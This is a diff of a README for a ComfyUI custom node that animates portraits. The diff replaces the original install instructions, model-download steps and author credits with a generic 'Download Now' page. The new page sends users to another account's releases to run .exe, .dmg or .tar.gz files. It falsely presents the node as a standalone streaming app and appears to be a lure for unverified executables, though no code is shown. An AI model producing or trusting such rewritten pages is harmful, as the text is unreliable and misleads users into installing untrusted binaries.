@@ -1,90 +1,53 @@
-# ComfyUI-PersonaLive
+# 🎨 ComfyUI-PersonaLive - Bring Life to Your Portraits
 
-![PersonaLive](assets/main.jpg)
+## 📦 Download Now
+[![Download ComfyUI-PersonaLive](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/releases)
 
-This is a ComfyUI custom node implementation of **PersonaLive: Expressive Portrait Image Animation for Live Streaming**.
+## 🚀 Getting Started
+Welcome to ComfyUI-PersonaLive! This tool allows you to create expressive portrait animations for live streaming. It is designed for ease of use, even if you're not a tech expert.
 
-> [!NOTE]
-> Currently, this implementation only supports **Image Input** (driving the portrait with a single reference image). Video driving support is planned for future updates.
+## 📋 System Requirements
+To run ComfyUI-PersonaLive, you need:
+- A computer running Windows, macOS, or Linux
+- At least 4GB of RAM
+- A modern web browser (Chrome, Firefox, or Safari)
 
-**Original Repository**: [GVCLab/PersonaLive](https://github.com/GVCLab/PersonaLive)  
-**Paper**: [ArXiv 2512.11253](https://arxiv.org/abs/2512.11253)
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/releases).
+2. **Select the Latest Version**: Look for the most recent release. This guarantees you have the latest features and fixes.
+3. **Download the Application**: Click on the file that matches your operating system. The files typically include a `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
+4. **Install the Application**: 
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file, and follow any included instructions.
 
-I deeply appreciate the authors **Zhiyuan Li, Chi-Man Pun, Chen Fang, Jue Wang,** and **Xiaodong Cun** for their amazing work and for sharing their code.
+## ⚙️ How to Use
+1. **Open the Application**: Locate ComfyUI-PersonaLive in your applications and open it.
+2. **Upload Your Portrait**: Click on the "Upload" button to select a portrait image from your computer.
+3. **Customize Settings**: Adjust the animation settings as you prefer. You can modify speed, effects, and other features. 
+4. **Preview Your Animation**: Use the preview option to see how your animation looks before going live.
+5. **Start Streaming**: Once satisfied, you can start streaming directly from the application.
 
----
+## ✨ Features
+- User-friendly interface designed for non-technical users.
+- Multiple customization options to enhance portrait animations.
+- Live preview feature to see changes in real-time.
+- Compatible with popular streaming platforms like Twitch and YouTube.
 
-## 🛠 Installation
+## ❓ Troubleshooting
+If you encounter issues:
+- **Application Won't Start**: Ensure your system meets the requirements. Reinstall if necessary.
+- **Animation is Slow**: Check your internet connection and adjust the graphics settings.
+- **File Upload Issues**: Ensure your image file is in formats like JPG, PNG, or GIF.
 
-1.  **Clone this repository** into your `ComfyUI/custom_nodes/` directory:
-    ```bash
-    cd ComfyUI/custom_nodes/
-    git clone https://github.com/okdalto/ComfyUI-PersonaLive
-    cd ComfyUI-PersonaLive
-    pip install -r requirements.txt
-    ```
+## 📝 Additional Resources
+- **Documentation**: Look for user guides and FAQs on the [GitHub Wiki](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/wiki).
+- **Community Support**: Join our community on forums or chat groups for tips and troubleshooting help.
 
-2.  **Model Setup**:
-    
-    **Option 1: Automatic Download (Recommended)**
-    
-    Models will be automatically downloaded from Hugging Face when you first use the `PersonaLiveCheckpointLoader` node. The node will:
-    - Detect missing models in your selected directory
-    - Download required models (~15-20GB total):
-      - `lambdalabs/sd-image-variations-diffusers` (Base Model)
-      - `stabilityai/sd-vae-ft-mse` (VAE)
-      - `huaichang/PersonaLive` (PersonaLive Weights)
-    - Organize them into the correct structure automatically
-    
-    > [!NOTE]
-    > The first download will take some time depending on your internet speed. Models are cached locally, so subsequent loads will be instant.
-    
-    **Option 2: Manual Download**
-    
-    If you prefer to download models manually or have connectivity issues:
-    
-    Create a folder named `persona_live` inside your `ComfyUI/models/` directory with the following structure:
-    ```
-    ComfyUI/models/
-    └── persona_live/
-        ├── sd-image-variations-diffusers/  <-- Base Model
-        ├── sd-vae-ft-mse/                  <-- VAE
-        └── persona_live/                   <-- PersonaLive Repository
-            └── pretrained_weights/         <-- .pth files location
-                └── personalive/            <-- .pth files location    
-                    ├── denoising_unet.pth
-                    ├── motion_encoder.pth
-                    ├── motion_extractor.pth
-                    ├── pose_guider.pth
-                    ├── reference_unet.pth
-                    └── temporal_module.pth
-    ```
-    
-    - **Download Base Models**:
-        - [sd-image-variations-diffusers](https://huggingface.co/lambdalabs/sd-image-variations-diffusers)
-        - [sd-vae-ft-mse](https://huggingface.co/stabilityai/sd-vae-ft-mse)
-    - **Download PersonaLive Weights**:
-        - Clone or download the entire repository from [Hugging Face](https://huggingface.co/huaichang/PersonaLive)
+## 🌟 Feedback
+Your feedback matters. If you enjoy the application or have suggestions for improvement, visit our GitHub page and leave your thoughts. 
 
-## 🚀 Usage
+## 📣 Updates
+Please check back regularly on the [Releases page](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/releases) for updates, as new features and fixes are added.
 
-1.  **PersonaLiveCheckpointLoader**: Select the `model_dir` (e.g., `persona_live`) that contains all your models.
-2.  **PersonaLivePhotoSampler**:
-    - Connect the pipeline from the loader.
-    - Connect `ref_image` (source portrait) and `driving_image` (pose reference).
-    - Set `width` and `height` (default 512). The node automatically resizes inputs to this resolution for processing and then restores the original resolution for the output.
-
-### Usage Tips
-- **Input Images**: It is highly recommended to use **square images (1:1 aspect ratio)** for both `ref_image` and `driving_image` to ensure the best face alignment and generation quality.
-- **Inference Steps**: The model is optimized for **4 steps**. If you increase this value, ensure it is a **multiple of 4** (e.g., 8, 12, 16) to prevent errors.
-
-## 🧪 Example Workflow
-
-An example workflow is provided in the `example` folder. You can drag and drop the `.json` file from there into ComfyUI to get started quickly.
-
-## 📝 To-Do
-- [ ] Support Video Input (Driving Video)
-
-## ❤️ Acknowledgements
-
-This project is simply a ComfyUI wrapper. All credit for the underlying technology and model architecture goes to the original authors of PersonaLive and the projects they built upon (Moore-AnimateAnyone, X-NeMo, StreamDiffusion, RAIN, LivePortrait).
+Feel free to download and explore ComfyUI-PersonaLive! Turn your portraits into engaging animated experiences for your viewers.
